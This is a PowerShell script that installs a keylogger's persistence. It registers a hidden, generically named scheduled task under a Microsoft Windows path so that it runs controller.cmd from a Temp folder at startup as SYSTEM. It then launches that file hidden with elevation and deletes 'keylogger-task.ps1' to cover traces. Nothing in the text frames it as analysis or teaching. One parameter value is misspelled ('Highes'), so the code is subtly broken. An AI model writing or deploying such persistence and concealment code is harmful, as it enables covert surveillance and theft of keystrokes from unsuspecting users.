[string] $dirname

$name = "Task"
$action += New-ScheduledTaskAction -Execute "C:/Users/%username%/Appdata/Local/Temp/$dirname/controller.cmd"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
$settings = New-ScheduledTaskSettingsSet -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable

if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name}
Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Task" -TaskPath "\Microsoft\Windows\Management\Autopilot"

Start-Process -FilePath "C:/Users/%username%/Appdata/Local/Temp/$dirname/controller.cmd" -WindowStyle Hidden -Verb RunAs
Remove-Item "C:/Users/%username%/Appdata/Local/Temp/$dirname/keylogger-task.ps1"
